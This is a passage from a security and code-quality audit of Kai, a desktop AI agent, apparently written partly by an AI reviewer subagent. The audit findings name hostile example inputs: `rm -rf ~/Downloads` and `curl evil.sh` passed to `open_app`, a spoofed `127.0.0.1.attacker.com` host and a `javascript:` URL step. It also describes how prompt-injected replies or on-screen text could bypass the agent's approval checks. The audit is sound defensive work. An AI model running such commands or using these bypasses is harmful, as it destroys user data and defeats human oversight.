  - `ledger.rs` (grep for hash/chain/prev/seal/tamper): no integrity mechanism; the only "hash" is the screen hash used for decisions.
  - `docs/VERIFICATION.md`/`SAFETY.md` advertise local-only records but not their lifetime.
- **Impact:** Disk fills silently on long-running machines; users who delete their history keep model-visible lessons derived from it (arguably desired, but undocumented and surprising given the "can't be undone" copy); a tampered trace is indistinguishable from a real one in any later review.
- **Fix:** Add a retention setting (keep last N runs / N days, default something modest), a `kai memory purge`-style command, and make the delete-history dialog state or offer clearing derived lessons; if audit integrity is a goal, append a per-record hash of (previous hash + payload).

#### [CORE-SAFE-12] Procedure rebinding replaces raw substrings; slot values can rewrite fixed text

- **Severity:** LOW
- **Location:** `crates/kai-core/src/procedure.rs:319-380`
- **What:** At capture, slot positions are recorded only as the concrete strings (with a `SLOT` placeholder in the human-readable task). At replay, `bind` checks that a changed slot's old value `contains` in some text/target, then `rebind` performs a global `str::replace` of that substring. A short numeric or common slot value ("1", "16", a filename fragment) can match inside unrelated step text (times, versions, other filenames), and the shell-safety check applies only when the *old* value appears in a Shell step's text.
- **Evidence:**
  - `procedure.rs:329-335`: `used` is a substring `contains`, not a token/whole-match.
  - `procedure.rs:366-380`: `s.replace(&old[i], mark)` over every step's text and target name.
  - `procedure.rs:339-348`: `shell_safe(new)` enforced only for Shell steps whose text contains `old`.
- **Impact:** Low probability, but a bound procedure can silently corrupt an unrelated part of a step description (worst case a shell argument) before replay; the user sees the edited steps, so it's recoverable.
- **Fix:** Capture slots as explicit markers at record time (the code already has the `mark` idea at rebind time), or require token-boundary matches when using substrings; extend `shell_safe`'s blast radius to be checked whenever the new value is injected into any text a Shell step derives from.

#### [CORE-SAFE-13] `scope::domain_of` treats anything starting with `127.0.0.1` as local

- **Severity:** LOW
- **Location:** `crates/kai-core/src/memory/scope.rs:148-152`
- **What:** `host.starts_with("127.0.0.1")` is true for `127.0.0.1.evil.com` (and any `127.0.0.1<anything>`), bypassing the label/TLD validation and returning the host scoped as a local server.
- **Evidence:**
  - `scope.rs:149-152`: `let local = host.starts_with("127.0.0.1") || host == "localhost"; if local { return Some(host.to_string()); }` — note this runs after the port is stripped (`:138`), so a suffix check would work.
  - `ok` (the normal validation at `:141-147`) is skipped on this path.
- **Impact:** A hostile domain crafted as `127.0.0.1.attacker.com` gets remembered/labeled as local, and an invalid host is accepted into lesson scope. Small, but it's a trust-label confusion in memory scoping.
- **Fix:** Require an exact match (`host == "127.0.0.1"` / `"localhost"` / `::1`) or a non-alphanumeric boundary before accepting the local shortcut.

#### [CORE-SAFE-14] Skill frontmatter parsing: minor edge cases

- **Severity:** LOW
- **Location:** `crates/kai-core/src/skill.rs:123-152, 169-190`
- **What:** Three small things: (1) `split_frontmatter` finds the first `\n---`, so a frontmatter value containing a line exactly `---` (possible in YAML block scalars) truncates early; (2) the name-must-match-directory check is skipped entirely when `dir.file_name()` is `None` or non-UTF-8 (e.g., a root path or odd encoding), so that check silently doesn't run; (3) `parse_steps` only deserializes JSON and validates no URL schemes, so `{"do":"open_url","url":"javascript:…"}` loads — engine risk checks still gate actions at replay, per `docs/PROCEDURES.md`, so this is defense-in-depth, not a hole.
- **Evidence:**
  - `skill.rs:182`: `let end = rest.find("\n---")?;`.
  - `skill.rs:144-151`: the mismatch error is inside `if let Some(dir_name) = …`.
  - `skill.rs:169-172`: `serde_json::from_str` and no further validation.
- **Impact:** Rare mis-parses or skipped validation for hand-crafted skills; deterministic steps rely on downstream checks, which is acceptable but undocumented as such.
- **Fix:** Parse the frontmatter fence only at the start of a line (the current `find` already requires `\n`; additionally require the closing fence be followed by `\n` or EOF), return an error when the directory name is unavailable, and optionally reject non-`https`/`http`/`file` schemes in deterministic steps at load time.

#### [CORE-SAFE-15] `fnv1a` is implemented three times

- **Severity:** LOW
- **Location:** `crates/kai-core/src/memory/mod.rs:273-280`, `crates/kai-core/src/plan_cache.rs:212`, `crates/kai-core/src/recorder.rs:82` (`fnv1a_hex`)
- **What:** The same FNV-1a hash appears in three modules (two private copies plus a hex-wrapping variant). They agree today; diverging silently would break id/name stability across memory, plan cache, and recorder files.
- **Evidence:** All three compute the standard offset basis `0xcbf2_9ce4_8422_2325` and prime `0x0000_0100_0000_01b3`; none calls another.
- **Impact:** Maintenance hazard only.
- **Fix:** Move one implementation into a small `util`/`hash` module and reuse it.

#### [CORE-SAFE-16] Outside the bench, `check=None` means the false-done rule never fires and gate refusals are never learned from

- **Severity:** INFO
- **Location:** `crates/kai-core/src/engine/memory.rs:76-92`, `crates/kai-core/src/trace.rs:250-252`
- **What:** `learn_from` passes `None` for the check to both `worth_reflecting` and `after_run` in every non-bench path, so rules keyed on "the run claimed done but the check failed" can never trigger for `kai run` or the app. Similarly `trace.gate` records every `done` the gate refused, but nothing in `learn.rs` reads it.
- **Evidence:**
  - `engine/memory.rs:80`: `learn::worth_reflecting(trace, None)`; `:85`: `store.after_run(trace, None, extra, true)`.
  - `trace.rs:250-252`: `gate: Vec<GateRecord>` with a comment that it records refusals and waivers; no `gate` usage in `learn.rs`.
- **Impact:** Some learning quality is left on the table; consistent with DECISIONS.md (verified deliberately bench-only), so flagged as an observation rather than a bug.
- **Fix:** If desired, derive a task-completion signal for non-bench runs (e.g., user stop vs clean done) and feed it to `worth_reflecting`; optionally mine gate refusals for `Avoid` lessons.

#### [CORE-SAFE-17] Silent load skips and consecutive-only dedup

- **Severity:** INFO
- **Location:** `crates/kai-core/src/memory/store.rs:55-78`, `crates/kai-core/src/memory/promote.rs:29-44`
- **What:** `MemoryStore::load` skips unparsable JSONL lines with no warning or count, so corruption quietly shrinks memory (the doc comment at `store.rs:55-56` states this). In `promote::suggestions`, `keys.dedup()` removes only adjacent duplicates; non-adjacent repeats are (harmlessly today) filtered later by the `out.iter().any(...)` guard at `:42`, but the `dedup` call itself is misleading.
- **Evidence:**
  - `store.rs:68-78`: the match simply ignores lines that parse as neither `Forget` nor `Lesson`.
  - `promote.rs:40`: `keys.dedup();` before the loop at `:41`.
- **Impact:** Debuggability and clarity only.
- **Fix:** Log/count skipped lines (surface in `kai memory`), and replace `dedup` with a `HashSet`-based unique or move it after sorting with a comment.

### Not needed / remove

- No dead files, dead modules, or abandoned code found in scope. The only removable duplication is the triple `fnv1a` (F15).
- `promote.rs`'s `keys.dedup()` is a no-op-in-spirit and could be dropped in favor of the existing `out`-guard (F17).
- Nothing else is a removal candidate; the experimental `macro_history` toggle is product surface, not cruft.

### What's good

- `shell_ro.rs` is exemplary: an allowlist with FORBIDDEN characters, execution without a shell, single-quoted PowerShell argument rebuilding, and a ~50-command test suite.
- The secure-field policy in `risk.rs:120-137, 296-321` (any route into a secure field is High, including untargeted typing when any focused secure field is present) is exactly the paranoid default it should be.
- `TypedSecrets` + the privacy pass blank typed secrets from later screens, traces and lessons before recorder/learn ever see them; the redaction is tested.
- `ledger.rs` ignores the model's own `status` field when establishing truth, and the engine gates `done` at most three times (DECISIONS.md-backed).
- Procedure lifecycle (candidate → active → quarantine → retire) is implemented conservatively and thoroughly tested in `procedure_tests.rs`.
- Memory hygiene is real: caps, compaction, near-duplicate merging, scope-aware recall, control-word refusal for model-written lessons, an exam step for proposals, and user lessons that are never auto-retired.
- `untrusted` phrase matching is whole-word (`has_phrase`), avoiding the classic "to any AI" false positive — there's even a comment and test about it.
- The docs (SAFETY/MEMORY/VERIFICATION) are unusually honest about limits (grids, CAPTCHAs, no a11y tree), which makes the few overclaims (F02, F04, F09) stand out as fixable drift rather than marketing.

### Open questions

1. Is F01 reachable end-to-end? I confirmed the classifier only, not the full engine path for model-proposed `shell` actions; if the engine independently refuses unknown interpreters before execution, severity drops, but the classifier should still catch it.
2. What is the actual default approval level for headless `kai run` (the engine default vs onboarding choice)? F01/F03/F04 impacts assume HighRiskOnly or Autopilot.
3. For F02, is `store.rs:180`'s `scrub(text) == text` round-trip check intended as the only defense for user lessons, or is an additional "looks like digits with separators" check wanted?
4. Should "Delete all history" (F11) also clear or explicitly preserve derived lessons? The copy says "can't be undone", but learning is a separate feature with its own settings row.
5. DECISIONS.md-verified items I deliberately did not file as bugs: bench-only false-done learning (`engine/memory.rs` check=None), procedures off by default, effect words using start-word matching (its *scope*, not the matcher, is F10).

---

## 3.4 OS-PER — Perception, input, OS integration

*Reviewed files: 34. Findings: 1C / 5H / 11M / 10L / 3I.*

Reviewer: OS-PER subagent. Method: every file read in full (line by line), no cargo
build/test. Extra context read to judge intent: `README.md`, `docs/MACOS.md`,
`docs/SAFETY.md`, `DECISIONS.md` (grepped + relevant sections), and the
kai-core / kai-app / kai-cli files my findings depend on
(`kai-core/src/risk.rs`, `schema.rs`, `element.rs`, `engine/act.rs`, `engine/fresh.rs`,
`engine/model_step.rs`, `mcp.rs`, `kai-app/src/mini.rs`, `kai-app/src/runs.rs`,
`kai-cli/src/main.rs`).

### Scope covered — checklist of every file read with line count + 1-line verdict

| File | Lines | Verdict |
|---|---|---|
| `crates/kai-os/src/a11y/mod.rs` | 455 | Solid: filtering, reading order, dedup, cap all deterministic and tested; `MIN_USEFUL=2`/`MAX_MARKS=150` are sane. |
| `crates/kai-os/src/a11y/active.rs` | 64 | Correct and minimal: title/bus are per-read, title cleared before each read. |
| `crates/kai-os/src/a11y/events.rs` | 104 | Good idea, but the listener can never restart and `start()` burns its `OnceLock` when called off-runtime. |
| `crates/kai-os/src/a11y/linux.rs` | 210 | Careful AT-SPI walk (Showing gate, ManagedDescendants cap, text for cells); active-window pick and visit cap are order-dependent and silent. |
| `crates/kai-os/src/a11y/linux_act.rs` | 268 | The strongest of the three actors: action-by-name, focus first, verify read-back, undo on partial fill, "effect unknown" is an error not a fallback. |
| `crates/kai-os/src/a11y/live.rs` | 230 | Good idea (mark+bounds+role re-check), but a process-global singleton shared by all runs/lanes; `clear()` is dead. |
| `crates/kai-os/src/a11y/macos.rs` | 265 | Well-gated FFI (SAFETY comments, 0.25 s messaging timeout, single multi-attr call, node/deadline caps); own-window not filtered. |
| `crates/kai-os/src/a11y/macos_act.rs` | 100 | Correct press/fill with live enabled/role checks and empty-only fill; no focus verification after setting `AXFocused`. |
| `crates/kai-os/src/a11y/macos_roles.rs` | 114 | Pure, well tested, mirrored role/name/clip logic — good pattern. |
| `crates/kai-os/src/a11y/windows.rs` | 123 | Cached single-pass UIA query is the right design; **never reads field text**, only one taskbar, no per-monitor roots. |
| `crates/kai-os/src/a11y/windows_act.rs` | 151 | Patterns chosen by role, value reads verified; first failing pattern aborts instead of trying the next. |
| `crates/kai-os/src/input.rs` | 289 | Single input thread + context checks are right; clipboard handling loses data and races the paste. |
| `crates/kai-os/src/input/clipboard.rs` | 21 | Correct one-handle-fits-all fix for the X11 drop bug; no non-text path at all. |
| `crates/kai-os/src/input/execute.rs` | 129 | Releases held keys/buttons on every error path, marks unrecoverable cleanup, honours cancellation inside drags. |
| `crates/kai-os/src/input/tests.rs` | 157 | Good fake-based tests: chord cleanup, cancelled drag, unsafe-session downcast, wheel axes. No clipboard test. |
| `crates/kai-os/src/marks.rs` | 223 | Clean bitmap-font SoM with crowd-aware tag placement and off-screen safety. |
| `crates/kai-os/src/frame.rs` | 363 | Correct HiDPI `to_display`, SIMD downscale, marks-aware sizing, two hashes; `crop` unused, env `KAI_FRAME_MAX_PIXELS` unvalidated. |
| `crates/kai-os/src/perceive.rs` | 339 | Parallel capture‖tree, mask-then-downscale-then-draw ordering is right; primary display only; mask rects depend on the caller. |
| `crates/kai-os/src/window.rs` | 206 | Pure `region` policy tested; the only own-pid guard, and it only affects the crop. |
| `crates/kai-os/src/zoom.rs` | 198 | Plan/render separated and tested (edge slide, upscale cap, cell→screen mapping). |
| `crates/kai-os/src/kill.rs` | 140 | Hotkey + fallback + corner are simple and testable; corner trips on Kai's own pointer moves and Wayland hotkeys silently don't fire. |
| `crates/kai-os/src/launch.rs` | 397 | **The critical hole lives here**: `open_app` reaches `sh -c` on Linux for any name that isn't a `.desktop` entry. |
| `crates/kai-os/src/shell.rs` | 286 | Process group + trip-check every 50 ms + output caps + readers grace are all right; Windows text is CLIXML/ANSI-mangled. |
| `crates/kai-os/src/secrets.rs` | 56 | Clean API, no plaintext fallback — but the Linux backend is the kernel keyring, not the Secret Service the file claims. |
| `crates/kai-os/src/permissions.rs` | 195 | Live checks with honest "Limited" on Wayland; good user-facing `fix` text; no cfg fallback for other OSes. |
| `crates/kai-os/src/notify.rs` | 127 | Correct AppleScript escaping (tested) and 2 s bound; a fresh D-Bus connection per notification. |
| `crates/kai-os/src/exclude.rs` | 21 | Minimal, correct `WDA_EXCLUDEFROMCAPTURE`, no-op elsewhere. |
| `crates/kai-os/src/computer.rs` | 131 | Versioned-tool adapter is small and validates through the core; restricts Back/Forward buttons for a macOS-only reason. |
| `crates/kai-os/src/desktop.rs` | 382 | Faithful Actuator with a well-tested kill guard; Linux-only GUI-launch fix and a silent typing fallback. |
| `crates/kai-os/src/probe.rs` | 211 | Read-only by construction (allowlisted `ReadOnlyCmd`, no shell), children die with the future; 4 MB file cap. |
| `crates/kai-os/src/lib.rs` | 28 | Tidy module list; doc comment still says "Linux and Windows" though macOS ships. |
| `crates/kai-os/examples/observe.rs` | 25 | Useful one-shot eyes dump. |
| `crates/kai-os/examples/probe.rs` | 217 | Excellent live instrument (tree/frames/a11y vs mouse/zoom/value), including a `PROBE_BEFORE_ACT` staleness hook. |
| `crates/kai-os/Cargo.toml` | 59 | Feature choices are mostly deliberate; `keyring = ["linux-native"]` has product consequences. |

Total: 34 files, 6 284 lines. No `TODO`/`FIXME`/`HACK`/`XXX`/`todo!`/`placeholder`
markers anywhere in `crates/kai-os/src` or `examples` (grep, see OS-PER-30).
The only `unreachable!` is out of scope (`src/web/act.rs:428`).

### Verdict

**Correctness 6/10** — the hard parts are right: Retina point/pixel scaling is
normalised once in `frame::to_display` and unit-tested; the marks' frame-space vs
screen-space split is consistent; linux_act verifies every action and treats a
timed-out action as *unknown* rather than redoing it; shell kills process groups
and caps output. Against that, whole behaviours are missing or platform-skewed:
field values on Windows, the 180 s GUI-shell block on macOS/Windows, and
`open_app` reporting success for a launch it never observed.

**Security 5/10** — the approval architecture is genuinely thoughtful
(a11y-first actions never press secure fields, the engine re-reads the target
before acting, `kills_kai` is careful), but there is one direct bypass:
`open_app` on Linux becomes `sh -c` for any non-desktop name, so a model or an
MCP client can delete files with no approval. Two milder gaps: the keyring
backend is the in-memory kernel keyring while README/SAFETY/DESIGN all say "OS
keychain", and Kai's own window is excluded from pixels but *not* from the
accessibility tree.

**Maintainability 7/10** — small files, prose comments that explain *why*,
pure-logic modules tested on every OS, and a consistent "fall back to the mouse
rather than guess" style. The costs: three divergent platform actors with no
parity checklist (the GUI-shell fix and field values only landed on Linux),
process-global singletons (`live`, `active`, frame config), and a few dead spots
(`live::clear`, `frame::crop`, `computer::act`'s unused validated request).

**Test coverage 7/10** — for a perception/input crate this is unusually good:
marks geometry and crowding, reading order, retina scaling, role mapping, the
kill guard, AppleScript quoting, shell caps/timeouts/kill, probe read-only
behaviour, the toolkit driver matrix, and a real macOS CI job. Missing:
`open_app` argument safety beyond four shell-syntax strings, anything clipboard,
a cross-platform parity test, and any test that masking rects stay fresh.

**Architecture fit 7/10** — kai-os implements the core's `Perceptor`/`Actuator`/
`Probe`/`Interrupt` ports cleanly and keeps OS-free policy in kai-core (the
`plan()`/`resolve()` split is a nice example). Where it bends: per-platform
policy (kill guard, GUI-launch detection) lives in kai-os and was only finished
for Linux, and the global live map assumes one run per process, which Team mode
and MCP can break.

### Findings

#### [OS-PER-01] `open_app` on Linux runs an arbitrary shell command, with no approval
- **Severity:** CRITICAL
- **Location:** `crates/kai-os/src/launch.rs:100-125` (`platform_open_app`, `spawn_detached`), `crates/kai-os/src/launch.rs:63-71` (`plain_app_name`), used from `crates/kai-os/src/desktop.rs:123,138-151` and `crates/kai-core/src/mcp.rs:305`
- **What:** `open_app` deliberately rejects shell *syntax* (`& | ; < > ^ $ \` " ' % !` and
  parens) and the code comment says "`open_app` is not the shell and is not approved
  like one". But on Linux, when the name does not match a `.desktop` entry, it runs
  `sh -c "setsid {name} >/dev/null 2>&1 &"` — and a name with spaces, arguments,
  slashes or `~` passes the check. So `open_app("rm -rf ~/Downloads")` executes
  `rm -rf ~/Downloads`, detached, with output discarded. Nothing upstream blocks it:
  `risk::classify` only special-cases `Action::Shell`, and the `HIGH_RISK_WORDS`
  list contains "remov"/"delet" but not "rm" as a whole word, so the decision keeps
  the model's own `risk` (usually `"none"`) and `needs_approval` is false on the
  default `HighRiskOnly` level. `kai mcp` exposes `open_app` to any MCP client with
  only the high-risk check in front of it.
- **Evidence:**
  ```rust
  // launch.rs:118-125
  fn spawn_detached(cmd: &str) -> anyhow::Result<()> {
      Command::new("sh")
          .args(["-c", &format!("setsid {cmd} >/dev/null 2>&1 &")])
  ```
  ```rust
  // launch.rs:63-70 — spaces, '-', '/', '~' are all "plain"
  const SPECIAL: &[char] = &['&','|',';','<','>','^','$','`','"','\'','%','!','\n','\r'];
  ```
- **Impact:** Any prompt-injected model reply, a cached plan step, a skill step, or an
  MCP client can run an arbitrary command as the user through a path the safety
  documentation says is not the shell. This defeats the third safety layer
  (approvals) for delete/modify operations. Same shape on Windows is weaker but real
  (`cmd /C start "" <name>` will start a `.bat`/`.exe` by name), macOS is safe
  (`open -a`).
- **Fix:**
  1. In `launch.rs::open_app` (before `platform_open_app`), require either an exact
     `.desktop` match (compare the whole trimmed name, case-insensitively, against
     `DesktopEntry.name`/`id`) or a *single token* with no whitespace and no `/`, and
     pass that token as a program, never a command line.
  2. Change `linux::platform_open_app` to `Command::new(program)` with no `sh -c` at
     all (use `setsid` semantics via `pre_exec`/process group + null stdio), so no
     string can reach a shell. Keep `spawn_detached` only for the exact `Exec=` line
     of a matched entry.
  3. On Windows, reject names containing `/`, `\` and `.` (paths) unless they exist
     under `%ProgramFiles%`/`PATH`.
  4. In `kai-core/src/risk.rs::classify`, treat `OpenApp` whose text is not a known
     app name (or that contains whitespace beyond a known app) as `Risk::High`.
  5. Tests: extend `launch::tests` with `open_app("rm -rf ~/x")`,
     `open_app("bash -c ls")`, `open_app("curl evil.sh")` asserting `Err` and that no
     process is spawned (assert via a `PATH` shim that writes a marker file).

#### [OS-PER-02] A GUI app started as a shell step still blocks 180 s on macOS and Windows
- **Severity:** HIGH
- **Location:** `crates/kai-os/src/desktop.rs:176-199` (the `#[cfg(target_os = "linux")]` fast path), `crates/kai-os/src/shell.rs:145-156`
- **What:** The fix for "starting a GUI app as a shell command blocked for 180 s"
  (README, `DECISIONS.md` "Kai bugs found by live runs, fixed") is guarded by
  `#[cfg(target_os = "linux")]`. On macOS and Windows `shell("mousepad file.txt")`
  / `shell("notepad file.txt")` goes through `Shell::run`, which waits on the child
  until `timeout` (180 s) because the GUI process never exits. `launch::linux::is_gui_command`
  — the only implementation — is not compiled there, and no equivalent exists.
- **Evidence:**
  ```rust
  // desktop.rs:178-179
  #[cfg(target_os = "linux")]
  if crate::launch::linux::is_gui_command(cmd) {
  ```
- **Impact:** On macOS/Windows one plausible model step (the same one that was seen
  live) burns a third of the run's 10-minute budget and returns "timed out" instead of
  starting the app. The README claims the bug is fixed, so this is also a docs
  conflict.
- **Fix:**
  1. Move the decision out of the cfg: add `launch::is_gui_command` with a Windows
     implementation (first word has no shell metacharacters and resolves through
     `AssocQueryString`/`App Paths` or matches a Start-menu app) and a macOS one
     (`first word` exists in `/Applications/*.app/Contents/MacOS/` or is a known
     `.app` name, or `open` is the first word).
  2. Keep the single detached-spawn helper per platform (`setsid -f` on Linux,
     `start ""` + `CREATE_NO_WINDOW` on Windows, `open -a` on macOS) and return the
     same "[exit 0]" text so the model's expectations do not change.
  3. Test: a platform-gated unit test asserting `is_gui_command("notepad f.txt")`,
     `("mousepad f.txt")`, `("open -a X f.txt")` are true and that `echo hi` is false;
     plus a live test that `shell("<gui app> f.txt")` returns in < 5 s on each OS.

#### [OS-PER-03] `paste()` destroys a non-text clipboard and keeps Kai's text if the set fails
- **Severity:** HIGH
- **Location:** `crates/kai-os/src/input.rs:215-230`, `crates/kai-os/src/input/clipboard.rs:8-21`
- **What:** `paste()` saves the clipboard with `clipboard_get()`, which only reads
  **text** (`arboard.get_text()`), and restores it only `if let Some(old)`. Any
  non-text clipboard (an image, copied files, rich HTML) returns `None`, so Kai
  overwrites it with its own text and never restores anything: the user's clipboard
  content is gone, and Kai's text (potentially an email body, address, or — on the
  MCP path — something typed in a form) stays in the clipboard indefinitely, readable
  by every app on the machine and, on macOS with Handoff, synced to the user's other
  devices. `saved == None` also silently means "we could not read it", not "it was
  empty", which hides the loss.
- **Evidence:**
  ```rust
  let saved = clipboard_get();              // text only
  clipboard_set(text)?;
  ...
  if let Some(old) = saved { let _ = clipboard_set(&old); }
  ```
- **Impact:** Data loss for anyone who copied an image or files before a Kai run, plus
  a clipboard-content leak window with no timeout. Only the unscoped `type_text`
  path pastes (>32 chars, no execution context), which today means `Action::Type`
  invoked through `Actuator::act` directly (MCP `kai_act`, probes, any embedding that
  does not use `act_context`).
- **Fix:**
  1. In `clipboard.rs`, keep the raw clipboard contents: read `get_image()`,
     `get().file_list()`/`html()` where the platform supports it and store an enum;
     on restore write the same kind back. If the kind cannot be read, **do not paste**
     — return an error so the caller falls back to per-character typing.
  2. Add a hard guarantee that the clipboard is restored exactly once, including on
     the cancellation path (`paste`'s sleep and `keys()` can be interrupted by the
     kill switch in `execute::run`), e.g. run the whole paste+restore on the input
     thread inside one `Cmd`, so a cancel cannot skip the restore.
  3. Clear Kai's text if a restore probe fails: `if set_text("")` is the least we can
     do when the old content is unreadable.
  4. Test: unit test with a fake clipboard backing store asserting (a) text is
     restored, (b) an image clipboard makes `paste` return `Err` and never calls
     `set_text`, (c) a cancelled `keys` still restores.

#### [OS-PER-04] The clipboard restore races the application reading it
- **Severity:** HIGH
- **Location:** `crates/kai-os/src/input.rs:223-228`
- **What:** `paste()` fires `ctrl/cmd+v` and then sleeps a fixed 250 ms before
  restoring the user's clipboard. The target app reads the clipboard asynchronously
  (and may queue the request behind a busy UI thread). On a slow or paused reader the
  paste either arrives empty or — much worse — the app pastes the **user's previous
  clipboard content** into the field, i.e. Kai types something the user never asked
  for and the trace cannot explain.
- **Evidence:**
  ```rust
  let r = self.keys(&[modifier.to_string(), "v".to_string()]).await;
  // Give the target app time to read the clipboard before restoring it.
  tokio::time::sleep(Duration::from_millis(250)).await;
  if let Some(old) = saved { let _ = clipboard_set(&old); }
  ```
- **Impact:** Wrong text appears in the user's app (and once in the model's trace),
  or the intended text is silently lost. Timing-dependent, so it will be reported as
  "Kai typed garbage" with no reproduction.
- **Fix:**
  1. Prefer an ownership handshake: keep Kai's text on the clipboard and verify with a
     read-back (`clipboard_get() == text`) plus a *target-side* confirmation — e.g.
     wait until the field's a11y value changes (Linux/macOS) or until the screen hash
     stops changing (`perceptor.settle`) before restoring, with a 1–2 s bound.
  2. Never restore before at least one full read cycle has been observed, and make the
     fallback "leave Kai's text in place and say so" (log a line) rather than
     restoring blind.
  3. Add a test that a slow reader (fake clipboard that records reads) sees the pasted
     text regardless of the restore delay.

#### [OS-PER-05] Linux API keys live in the kernel keyring, not the Secret Service, and vanish at reboot
- **Severity:** HIGH
- **Location:** `Cargo.toml:35` (`keyring = { features = ["apple-native","windows-native","linux-native"] }`), `crates/kai-os/src/secrets.rs:1-2,21-35`
- **What:** `linux-native` in keyring 3 means the **kernel keyutils** store, whose own
  documentation says: "The key management facility provided by the kernel is completely
  in-memory and will not persist across reboots. Consider the keyring a secure cache
  and plan for your application to handle cases where the entry is no-longer
  available."  `secrets.rs` claims "Secret Service on Linux", README says "API keys
  live in the OS keychain", `docs/DESIGN.md:234` says "keys in the OS keychain".
  There is no reload/prompt fallback, and no `sync-secret-service` feature is enabled,
  so the Secret Service (GNOME Keyring/KWallet) is never used. Security-wise a user
  keyring is also weaker than the Secret Service: any process of the same uid can read
  it with no unlock ceremony or prompt.
- **Evidence:**
  ```toml
  keyring = { version = "3", features = ["apple-native", "windows-native", "linux-native"] }
  ```
  keyring-3.6.3 `src/keyutils.rs`: "completely in-memory and will not persist across
  reboots".
- **Impact:** On Linux, `kai key gemini` appears to work, then after the next reboot
  Kai reports no key (onboarding "connect a model" fails, `kai run` errors) with no
  explanation. Security reviewers/users believing the README get a weaker store than
  advertised. macOS/Windows are fine (`apple-native`, `windows-native`).
- **Fix:**
  1. Switch the Linux feature to `linux-native-sync-persistent` (or add
     `sync-secret-service` + `crypto-rust`) so keys land in the desktop keychain and
     survive reboots.
  2. In `secrets::get`, distinguish `NoEntry` (report "no key stored") from other
     errors, and surface "the keychain is locked/unavailable — run `kai key <backend>`
     again" instead of the bare `None`.
  3. If the keyutils choice is deliberate, fix `secrets.rs:1`, `README.md`, and
     `docs/DESIGN.md` to say "kernel session keyring (cleared at reboot)" and add a
     first-run warning; add a unit/integration test (`kai key set` → clear the session
     keyring → assert the error is the "no key" message).

#### [OS-PER-06] Kai's own app is kept out of the pixels but not out of the accessibility tree
- **Severity:** HIGH
- **Location:** `crates/kai-os/src/a11y/macos.rs:68-115` (frontmost app), `crates/kai-os/src/a11y/windows.rs:47-52` (foreground HWND), `crates/kai-os/src/window.rs:24-44` (the only own-pid guard)
- **What:** Every capture path hides Kai's own windows (`exclude.rs`,
  `frame::mask`, `set_excluded`), but no tree read filters by pid. At the moment a run
  starts the user has just clicked Run in Kai's main window, so Kai itself is the
  frontmost/active app for the first observation: on macOS `frontmost_pid()` returns
  Kai's pid and the walk starts at Kai's focused window (AppKit always exposes the
  window and its standard close/minimise/zoom buttons), on Windows
  `GetForegroundWindow` is Kai's window. The result is marks for Kai's own controls,
  drawn on a frame where that window is painted over with `[24,24,24]`, so the model
  sees named controls ("close", "minimise") on a black rectangle and can click them.
  `window::region` returns `None` for `own_pid`, but that only affects `KAI_WINDOW_SCOPE`
  cropping — it does not stop the tree read.
- **Evidence:**
  ```rust
  let app = frontmost_pid()
      .map(|pid| unsafe { AXUIElement::new_application(pid) })   // macos.rs:75-77
  ```
  ```rust
  if f.pid == own_pid { return None; }   // window.rs:26 — crop only
  ```
- **Impact:** A wasted or derailed first step (the model sees only Kai's own chrome),
  and on macOS/Windows the model can drive Kai's own UI, including the mini window's
  Stop/Pause controls — if GPUI's accessibility feature is ever enabled in
  `kai-app/Cargo.toml`, that extends to the approval buttons. Also a self-referential
  prompt-injection surface ("the window says: Approve").
- **Fix:**
  1. In each platform read, compare the frontmost/active app's pid with
     `std::process::id()`; when equal, do not walk it at all — set the active title to
     `None` and return a grid-forcing empty list so `observe_tree_only` falls back to a
     full frame (and the engine keeps clicking nothing).
  2. Add a `RawNode.owner_pid` (or a per-read `own_app: bool`) so `ground_indexed`
     can drop anything from Kai's pid even if a future reader walks more than one app.
  3. In `DesktopPerceptor::set_excluded`, also record whether the excluded region is
     the whole current view; if so, log/annotate the observation (the UI can show "Kai
     has focus").
  4. Tests: role-mapping-style unit test for the pid filter, plus a macOS live check
     (`scripts/macos/live_check.sh`) asserting the first observation after `Run` has
     zero marks whose window belongs to Kai.

#### [OS-PER-07] Windows never reports a field's text, unlike Linux and macOS
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/a11y/windows.rs:93-103` (`value: None`)
- **What:** Linux reads `AT-SPI Text` (first 200 chars) and macOS reads `AXValue`, but
  the Windows reader sets `value: None` for every node even though
  `UIValuePattern` is what `windows_act::fill` uses for the emptiness check. So on
  Windows the model cannot see what it typed, `live::Plan::Fill`'s "empty only" rule is
  decided without the tree, and `DECISIONS.md` ("The element list now shows text-field
  values (never for secure fields)") is only true on two of three platforms.
- **Evidence:**
  ```rust
  focused: el.has_cached_keyboard_focus().unwrap_or(false),
  value: None,
  ```
- **Impact:** Worse grounding on Windows: after typing, the model must fall back to
  pixels (`type` verification, "is the field still empty?"), and a field that already
  shows a typed card number cannot be redacted from the element list (SAFETY.md's
  "blanked to `[sensitive data]`" path has nothing to blank). Adds real step cost on
  the platform where the benchmark numbers are weakest.
- **Fix:**
  1. In `windows::read`, add `UIProperty::ValueValue` to the cache request and map it
     into `RawNode.value` for `Edit`/`Document`/`ComboBox` control types only, never
     when `is_cached_password()`.
  2. Guard length (200 chars, like Linux) and remember UIA's `ValueValue` can be
     non-string (Numeric) — coerce with a variant check, not `unwrap`.
  3. Test: a Windows-gated unit test on a helper `value_for(control_type, value,
     is_password)` plus one live check in the Windows CI job asserting a filled
     Notepad field round-trips into `RawNode.value`.

#### [OS-PER-08] PowerShell output is CLIXML/ANSI-mangled on the Windows shell path
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/shell.rs:130-143`
- **What:** Commands run as `powershell -NoProfile -NonInteractive -Command <cmd>` with
  **piped** stdout/stderr. Windows PowerShell 5.1 writes error records to a redirected
  stderr as CLIXML (`#< CLIXML` followed by `<Objs Version="1.1.0.1">…<S S="Error">…`),
  and uses the console's OEM/ANSI code page for redirected output rather than UTF-8.
  `read_capped` then hands that straight to the model through
  `String::from_utf8_lossy`, and `Captured::take` joins stdout/stderr only at the end.
- **Evidence:**
  ```rust
  Command::new("powershell")
      .args(["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", cmd])
  ```
  ```rust
  (String::from_utf8_lossy(&g.0).into_owned(), g.1)   // shell.rs:195
  ```
- **Impact:** On Windows every failing command's `[stderr]` block is XML noise instead
  of the message, and any non-ASCII filename or path comes back as `?`. The model
  cannot read its own errors, so failure recovery degrades to guessing — the exact
  loop the Linux path was hardened for.
- **Fix:**
  1. Prefer `pwsh` when present (`which pwsh`), else keep `powershell` and strip the
     CLIXML wrapper in code: if the stream starts with `#< CLIXML`, decode the XML and
     concatenate the `<S S="Error">`/`<S S="Error">` texts back into plain lines.
  2. Force a known encoding at the front of every command:
